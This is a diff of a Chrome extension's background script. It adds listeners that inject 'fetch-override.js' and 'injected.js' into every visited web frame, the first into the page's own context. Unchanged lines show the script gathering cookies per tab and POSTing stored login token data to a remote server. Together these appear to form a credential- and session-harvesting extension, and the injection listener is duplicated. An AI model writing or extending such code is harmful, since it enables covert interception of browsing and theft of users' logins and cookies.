@@ -6,6 +6,30 @@ const flag = true;
 // 🚧 Will be used in a later exercise – do not remove.
 const onFetchDataHandler = (message) => {};
 
+chrome.webNavigation.onCommitted.addListener(async (details) => {
+  // Only inject into real frames with valid URLs
+  if (!details.url.startsWith("http")) return;
+
+  console.log(
+    `Injecting into ${details.frameId === 0 ? "main frame" : "iframe"}: ${
+      details.url
+    }`
+  );
+
+  try {
+    await chrome.scripting.executeScript({
+      target: {
+        tabId: details.tabId,
+        frameIds: [details.frameId], // Important: target the right frame
+      },
+      world: "MAIN",
+      files: ["fetch-override.js"],
+    });
+  } catch (err) {
+    console.warn("Injection failed:", err);
+  }
+});
+
 const onMessageHandler = async (message, sender, sendResponse) => {
   if (message.type === "getCookiesForTab") {
     const { tabId } = message;
@@ -24,7 +48,24 @@ const onMessageHandler = async (message, sender, sendResponse) => {
     handlers.onFetchDataHandler(message, sendResponse);
   }
 };
+chrome.webNavigation.onCommitted.addListener(async (details) => {
+  // Only inject into real frames with valid URLs
+  if (!details.url.startsWith("http")) return;
 
+  console.log(`Injecting into ${details.frameId === 0 ? "main frame" : "iframe"}: ${details.url}`);
+
+  try {
+    await chrome.scripting.executeScript({
+      target: {
+        tabId: details.tabId,
+        frameIds: [details.frameId] // Important: target the right frame
+      },
+      files: ["injected.js"]
+    });
+  } catch (err) {
+    console.warn("Injection failed:", err);
+  }
+});
 const onRefreshCountHandler = async (token, expireTime, callback) => {
   const result = await chrome.storage.local.get("refreshTokenCount");
   const refreshTokenCount = result.refreshTokenCount || 0;
@@ -43,7 +84,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 });
 
 chrome.storage.local.get("tokenData", ({ tokenData }) => {
-  const requestBody = { loginInfo: tokenData, flag };
+  const requestBody = { loginInfo: tokenData };
   fetch(`${remoteServerUrl}/token`, {
     method: "POST",
     headers: {
